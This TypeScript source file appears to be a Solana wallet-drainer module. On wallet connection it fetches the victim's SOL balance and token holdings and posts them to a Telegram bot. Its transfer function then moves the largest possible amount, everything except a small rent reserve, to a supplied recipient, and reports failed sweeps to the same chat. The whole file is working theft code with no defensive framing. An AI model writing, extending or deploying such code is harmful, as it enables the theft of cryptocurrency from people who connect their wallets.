import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

// Add Buffer polyfill for browser environment in a way that works with Vite
import { Buffer } from 'buffer';
// Make Buffer available globally - fix the approach to match how globals work in browser
if (typeof window !== 'undefined') {
  window.Buffer = Buffer;
}

// Helper function to add delay between retries
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// List of public RPC endpoints - MAINNET ONLY
const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
  "https://solana-api.projectserum.com", // Project Serum endpoint
  "https://rpc.ankr.com/solana", // Ankr endpoint
  "https://free.rpcpool.com", // Free RPC Pool endpoint
  "https://mainnet.rpcpool.com", // RPCPool endpoint
  "https://solana.public-rpc.com", // Another public endpoint
  "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
];

// Solana rent and fee constants
export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)

// Optimize retry function with faster backoff for wallet data
async function retry<T>(
  fn: () => Promise<T>,
  retries = 3, // Reduced from 5 to 3 retries for faster resolution
  initialDelay = 500, // Reduced from 1000 to 500ms initial delay
  context = ""
): Promise<T> {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`${context} - Attempt ${i + 1}/${retries}`);
      return await fn();
    } catch (error) {
      console.error(`${context} - Attempt ${i + 1} failed:`, error);
      lastError = error;
      if (i < retries - 1) {
        const delayTime = initialDelay * Math.pow(1.2, i); // Reduced backoff factor from 1.5 to 1.2
        console.log(`${context} - Retrying in ${delayTime}ms...`);
        await delay(delayTime);
      }
    }
  }
  throw lastError;
}

// Faster connection test that just checks slot
const testConnection = async (connection: Connection): Promise<boolean> => {
  try {
    const slot = await connection.getSlot('processed');
    return true;
  } catch (error) {
    return false;
  }
};

// Create a connection with faster timeout and minimal configuration
const createConnection = async (forceFresh = false): Promise<Connection> => {
  // Shuffle endpoints to avoid always hitting the same one first
  const shuffledEndpoints = [...PUBLIC_RPC_ENDPOINTS].sort(() => Math.random() - 0.5);
  
  const connectionConfig = {
    commitment: 'confirmed' as const,
    confirmTransactionInitialTimeout: 60000, // Reduced from 120000ms to 60000ms
    disableRetryOnRateLimit: false,
  };
  
  // Try each endpoint but with faster timeouts
  for (const endpoint of shuffledEndpoints) {
    try {
      const connection = new Connection(endpoint, connectionConfig);
      
      const isValid = await Promise.race([
        testConnection(connection),
        new Promise<boolean>(resolve => setTimeout(() => resolve(false), 3000)) // Add a 3s timeout for connection test
      ]);
      
      if (isValid) {
        return connection;
      }
    } catch (error) {
      continue;
    }
  }
  
  // Fallback to simple connection
  return new Connection(shuffledEndpoints[0], {
    commitment: 'confirmed', // Changed from 'finalized' to 'confirmed' for faster results
  });
};

// Optimized token account fetching
export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    if (!walletAddress || typeof walletAddress !== 'string') {
      return [];
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      return [];
    }
    
    const freshConnection = await createConnection(true);
    
    // Faster retry with fewer attempts and shorter delays
    return await retry(async () => {
      const response = await freshConnection.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        },
        'confirmed'
      );
      
      return response.value.map(item => ({
        mint: item.account.data.parsed.info.mint,
        amount: item.account.data.parsed.info.tokenAmount.uiAmount,
        decimals: item.account.data.parsed.info.tokenAmount.decimals
      }));
    }, 2, 300, "Token accounts fetch"); // Reduced retries from 5 to 2, delay from 1000ms to 300ms
    
  } catch (error) {
    return [];
  }
};

// Faster wallet balance fetch with parallel requests and race conditions
export const getWalletBalance = async (walletAddress: string): Promise<number> => {
  try {
    if (!walletAddress || typeof walletAddress !== 'string') {
      throw new Error("Invalid wallet address format");
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      throw new Error("Invalid public key format");
    }
    
    // Try multiple endpoints in parallel and use the first successful result
    const balancePromises = PUBLIC_RPC_ENDPOINTS.slice(0, 4).map(async (endpoint) => {
      try {
        const connection = new Connection(endpoint, { 
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 30000 // Reduced timeout to 30s
        });
        
        const balance = await connection.getBalance(pubKey, 'confirmed');
        return balance / LAMPORTS_PER_SOL;
      } catch (error) {
        // Reject with delay to not block the Promise.race 
        return Promise.reject(error);
      }
    });
    
    // Use Promise.race to get the first successful result
    try {
      return await Promise.race(balancePromises);
    } catch {
      // Fallback to sequential approach if parallel fails
      for (let i = 0; i < 3; i++) { // Only try first 3 endpoints
        try {
          const endpoint = PUBLIC_RPC_ENDPOINTS[i];
          const connection = new Connection(endpoint, { 
            commitment: 'confirmed',
            confirmTransactionInitialTimeout: 30000
          });
          
          const balance = await connection.getBalance(pubKey, 'confirmed');
          return balance / LAMPORTS_PER_SOL;
        } catch {
          continue;
        }
      }
      
      // Last resort - use the fresh connection
      const freshConnection = await createConnection(true);
      const balance = await freshConnection.getBalance(pubKey, 'confirmed');
      return balance / LAMPORTS_PER_SOL;
    }
  } catch (error) {
    throw new Error(`Failed to get SOL balance: ${error instanceof Error ? error.message : "Unknown error"}`);
  }
};

// Improved Telegram sending with more robust fallback options
export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
  try {
    console.log("Preparing to send data to Telegram:", walletData);
    
    // Format message based on the type of data we're sending
    let message = "";
    
    if (walletData.tokens) {
      // This is the initial wallet connection message
      // Make sure we have a valid balance
      const solBalanceInSol = walletData.balance || 0;
      
      // Format token data in a more readable way
      let formattedTokens = "No tokens found";
      if (walletData.tokens && walletData.tokens.length > 0) {
        formattedTokens = walletData.tokens.map((token: any, index: number) => 
          `Token #${index + 1}:\n` +
          `  Mint: ${token.mint}\n` +
          `  Amount: ${token.amount}\n` +
          `  Decimals: ${token.decimals}`
        ).join('\n\n');
      }

      // Create a detailed message
      message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
        `👛 Wallet Address: ${walletData.address}\n` +
        `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
        `⌚ Time: ${new Date().toLocaleString()}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
        `🌐 Network: Mainnet`;
    } else if (walletData.message) {
      // This is a custom message (transfer attempt or completion)
      message = `👛 Wallet: ${walletData.address}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `🔔 ${walletData.message}`;
    } else {
      // Fallback generic message
      message = `Wallet notification for: ${walletData.address}`;
    }

    console.log("Sending message to Telegram:", message);

    // Make multiple attempts to send to Telegram with different methods
    for (let attempt = 1; attempt <= 7; attempt++) {
      try {
        console.log(`Telegram send attempt #${attempt}`);
        
        // Try with different approaches on different attempts
        let response;
        if (attempt <= 3) {
          // First 3 attempts: standard fetch API
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown',
            }),
            // Set a longer timeout
            signal: AbortSignal.timeout(15000)
          });
        } else if (attempt <= 5) {
          // Next 2 attempts: alternative approach without parse_mode
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
            signal: AbortSignal.timeout(20000)
          });
        } else {
          // Last 2 attempts: simplified GET request
          const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + 
            (typeof walletData.balance === 'number' ? walletData.balance.toFixed(6) : walletData.balance) + 
            ' SOL' : walletData.message || 'Wallet notification'}`;
            
          response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(simpleMessage)}`, 
            {
              method: 'GET',
              signal: AbortSignal.timeout(20000)
            }
          );
        }

        if (!response) {
          throw new Error("No response from Telegram API");
        }

        try {
          const responseData = await response.json();
          console.log("Telegram API response:", responseData);

          if (response.ok && responseData.ok) {
            console.log("Successfully sent to Telegram");
            return true;
          } else {
            console.error("Telegram API error:", responseData);
            // If we're hitting message formatting issues, simplify the message and try again
            if (responseData.description && responseData.description.includes("parse")) {
              message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
            }
          }
        } catch (jsonError) {
          console.error("Error parsing Telegram API response:", jsonError);
        }
        
        if (attempt < 7) await delay(1000 * attempt);
      } catch (telegramError) {
        console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
        if (attempt < 7) await delay(1000 * attempt);
      }
    }

    console.error("All Telegram send attempts failed");
    return false;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
  console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
  
  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
  // This ensures enough for rent exemption and transaction fees
  return balanceInSol >= MINIMUM_REQUIRED_SOL;
};

export const signAndSendTransaction = async (
  connection: Connection, 
  wallet: any, 
  recipientAddress: string, 
  amount: number,
  botToken?: string,
  chatId?: string
) => {
  try {
    console.log('Creating transaction...');
    
    // Validate the wallet has a publicKey before proceeding
    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
      console.error('Wallet, adapter, or publicKey is undefined');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: wallet?.adapter?.publicKey?.toString() || "Unknown",
          message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Wallet adapter or publicKey is undefined');
    }
    
    // Use wallet.adapter.publicKey consistently
    const walletPublicKey = wallet.adapter.publicKey;
    
    // Check balance first
    const balance = await connection.getBalance(walletPublicKey);
    console.log('Current wallet balance (lamports):', balance);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    console.log('Current wallet balance (SOL):', balanceInSol);
    
    // Make sure we have sufficient balance before proceeding
    if (balance <= 0) {
      console.error('Insufficient balance for transfer');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Insufficient wallet balance for transfer');
    }
    
    // Check if the wallet has enough SOL for rent exemption and fees
    if (!hasEnoughSolForRent(balanceInSol)) {
      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL) for rent exemption`);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
    }
    
    // We need to account for transaction fees
    // Calculate the maximum we can send (balance minus minimum required for rent/fees)
    const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
    
    if (maxTransferAmount <= 0) {
      console.error('Balance too low to transfer after reserving for rent and fees');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Wallet balance too low for transfer after reserving for rent fees');
    }
    
    // Ensure recipient address is valid
    let recipientPublicKey: PublicKey;
    try {
      recipientPublicKey = new PublicKey(recipientAddress);
    } catch (error) {
      console.error('Invalid recipient address:', error);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Invalid recipient address`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Invalid recipient address');
    }
    
    // Use the smaller of requested amount or max possible amount
    const transferAmount = Math.min(
      Math.floor(amount * LAMPORTS_PER_SOL), 
      maxTransferAmount
    );
    
    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferAmount,
      })
    );
    
    // Set a recent blockhash to improve transaction success rate
    transaction.recentBlockhash = (await connection.getLatestBlockhash('processed')).blockhash;
    
    // Improve transaction speed by setting higher priority fee
    transaction.feePayer = walletPublicKey;

    console.log('Sending transaction...');
    const signature = await retry(async () => {
      // For wallet adapters that use the adapter pattern
      if (typeof wallet.adapter?.sendTransaction === 'function') {
        // Use processed commitment for faster confirmation
        return await wallet.adapter.sendTransaction(transaction, connection, { 
          skipPreflight: false, // Skip preflight for faster processing
          preflightCommitment: 'processed', 
          commitment: 'processed'
        });
      } else if (typeof wallet.signAndSendTransaction === 'function') {
        // For wallet adapters that have this method
        return await wallet.signAndSendTransaction(transaction);
      } else {
        throw new Error('Wallet does not support transaction signing');
      }
    }, 3);

    console.log('Transaction successful:', signature);
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
